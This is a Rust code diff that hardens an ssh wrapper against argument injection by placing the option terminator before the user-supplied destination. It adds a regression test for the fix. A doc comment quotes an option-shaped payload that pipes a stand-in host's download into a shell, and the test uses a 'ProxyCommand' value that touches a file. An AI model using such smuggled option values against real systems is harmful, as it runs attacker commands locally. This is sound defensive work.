@@ -31,11 +31,24 @@ use tracing::{error, info, warn};
 
 mod client;
 pub use client::{
-    CreateExtras, SessionListing, SupervisorClient, SupervisorError, TermDetachSignal, TermEvent,
-    TermStream,
+    CreateExtras, PeerHello, SessionListing, SessionPage, SupervisorClient, SupervisorError,
+    TermDetachSignal, TermEvent, TermStream,
 };
 
+/// The per-host connection actors, their reconnect state machine, and the
+/// cache refresh that rides them (PLAN_M6.md item 4).
+///
+/// Deliberately NOT wired into the serving path below: `AppState`'s single
+/// client is still what answers every request in this milestone step, and
+/// PLAN_M6.md's order of work puts aggregation and REST host management in
+/// the next PR. The module is public because that PR — and the desktop
+/// embedder after it — are its consumers.
+pub mod manager;
+
 pub mod store;
+
+#[cfg(test)]
+mod test_capture;
 
 /// CLI arguments for `farhelm helm run`. Lives here (not in the bin
 /// crate) so the helm's surface and its implementation evolve together.
@@ -440,6 +453,21 @@ async fn attachment_preflight() -> axum::response::Response {
 /// so anything that may contain spaces (the remote state dir) must be
 /// quoted as that shell will parse it, or the path word-splits remotely.
 ///
+/// **`--` goes before the DESTINATION, not after it**, and that ordering is
+/// a security boundary rather than a stylistic choice. A destination is
+/// user-supplied text (M1's `--ssh` argument, and from M6 a registry row
+/// anyone with helm access can write), so a value shaped like
+/// `-oProxyCommand=curl evil|sh` is parsed by OpenSSH's own getopt loop as
+/// an OPTION and executed — a local command injection with no ssh
+/// connection involved at all — for as long as the option terminator sits
+/// anywhere after it. Placed first, `--` ends option parsing before ssh
+/// ever looks at the destination, and it still covers the remote argv
+/// (`--state-dir` below) that the old placement was protecting.
+/// [`crate::store::HelmStore::add_ssh_host`] additionally refuses
+/// option-shaped destinations at the registry boundary so the user gets a
+/// clear error instead of a puzzling ssh failure; THIS ordering is the
+/// actual guard, and it holds for callers that never go through the store.
+///
 /// The UTF-8 requirement enforced below is specific to this ssh path;
 /// local-only mode (no `--ssh`) keeps native `OsString` state paths and
 /// still tolerates non-UTF-8 homes (see `farhelm_supervisor::default_state_dir`).
@@ -483,8 +511,11 @@ fn ssh_args(
         control_path,
         "-o".to_string(),
         "ControlPersist=60".to_string(),
-        dest.to_string(),
+        // See this function's own docs: the terminator precedes the
+        // destination so an option-shaped destination can never be read as
+        // an option.
         "--".to_string(),
+        dest.to_string(),
         shell_words::quote(remote_farhelm).into_owned(),
         "internal".to_string(),
         "stdio".to_string(),
@@ -613,7 +644,8 @@ fn annotate_ssh_handshake_eof(
     e.context(format!(
         "the ssh channel to {dest} closed before the handshake completed: either no supervisor \
          is running on {dest} (start one there with `{remedy}`), or the ssh connection itself \
-         failed — ssh reports its own errors on stderr above"
+         failed — ssh reports its own errors on stderr, which a direct `--ssh` connection prints \
+         above and a registered host relays into the helm's log"
     ))
 }
 
@@ -2303,6 +2335,61 @@ mod tests {
         ));
     }
 
+    /// The remote argv, as ssh will hand it to the remote login shell:
+    /// everything after the option terminator AND the destination that now
+    /// follows it (see [`ssh_args_terminate_options_before_the_destination`]
+    /// for why the destination sits there).
+    fn remote_command(args: &[String]) -> Vec<String> {
+        let dashdash = args.iter().position(|a| a == "--").expect("-- separator");
+        let remote = args[dashdash + 2..].join(" ");
+        shell_words::split(&remote).expect("remote command must be shell-parseable")
+    }
+
+    /// The argv-injection regression: OpenSSH parses options up to the
+    /// terminator, so a destination shaped like `-oProxyCommand=...` is read
+    /// as an OPTION — and `ProxyCommand` runs a LOCAL shell command — for as
+    /// long as `--` sits after it. This pins the ordering that closes it:
+    /// the terminator precedes the destination, and the destination is
+    /// therefore always a positional argument no matter what it contains.
+    ///
+    /// Asserted on the argv itself rather than by running ssh, because the
+    /// bug is entirely in argument order and the exploit would otherwise
+    /// need a real ssh, a real shell, and an observable side effect to
+    /// detect.
+    #[test]
+    fn ssh_args_terminate_options_before_the_destination() {
+        let hostile = "-oProxyCommand=touch /tmp/pwned";
+        let args = super::ssh_args(
+            hostile,
+            std::path::Path::new("/state/ssh-cm-%C"),
+            "farhelm",
+            Some("/remote/state"),
+        )
+        .unwrap();
+        let dashdash = args.iter().position(|a| a == "--").expect("-- separator");
+        assert_eq!(
+            args[dashdash + 1],
+            hostile,
+            "the destination must sit immediately after the option terminator: {args:?}"
+        );
+        assert!(
+            !args[..dashdash].iter().any(|a| a == hostile),
+            "no copy of the destination may precede the terminator: {args:?}"
+        );
+        // The remote argv the old placement was protecting must still be
+        // covered: `--state-dir` is past the terminator too.
+        assert_eq!(
+            remote_command(&args),
+            vec![
+                "farhelm",
+                "internal",
+                "stdio",
+                "--state-dir",
+                "/remote/state"
+            ]
+        );
+    }
+
     /// The executable is part of ssh's reconstructed remote command too,
     /// not a local argv passed directly to exec. It needs the same POSIX
     /// quoting as the remote state directory.
@@ -2315,10 +2402,10 @@ mod tests {
             None,
         )
         .unwrap();
-        let dashdash = args.iter().position(|a| a == "--").expect("-- separator");
-        let remote = args[dashdash + 1..].join(" ");
-        let parsed = shell_words::split(&remote).expect("remote command must be shell-parseable");
-        assert_eq!(parsed, vec!["/opt/far helm's/bin", "internal", "stdio"]);
+        assert_eq!(
+            remote_command(&args),
+            vec!["/opt/far helm's/bin", "internal", "stdio"]
+        );
     }
 
     #[test]
@@ -2330,11 +2417,8 @@ mod tests {
             Some("/home/u/my state/farhelm"),
         )
         .unwrap();
-        let dashdash = args.iter().position(|a| a == "--").expect("-- separator");
-        let remote = args[dashdash + 1..].join(" ");
-        let parsed = shell_words::split(&remote).expect("remote command must be shell-parseable");
         assert_eq!(
-            parsed,
+            remote_command(&args),
             vec![
                 "farhelm",
                 "internal",
